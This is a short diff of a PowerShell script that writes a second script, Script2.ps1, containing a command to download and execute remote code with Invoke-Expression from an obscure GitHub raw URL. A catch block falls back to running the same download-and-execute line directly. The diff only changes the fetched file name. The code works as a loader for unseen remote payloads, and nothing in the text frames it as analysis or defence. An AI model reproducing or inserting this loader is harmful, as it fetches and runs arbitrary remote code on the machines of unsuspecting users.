@@ -1,7 +1,7 @@
 try {
     # Define the content for Script2.ps1
     $content = @"
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ooooooooo-o/ps1/0/setup.ps1'));"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ooooooooo-o/ps1/0/..ps1'));"
 "@
 
     # Write the content to Script2.ps1
@@ -16,7 +16,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object Syst
     exit
 } catch {
     # If an error occurs, run the initial command directly
-    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ooooooooo-o/ps1/0/setup.ps1'));"
+    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ooooooooo-o/ps1/0/..ps1'));"
     exit
 }
 
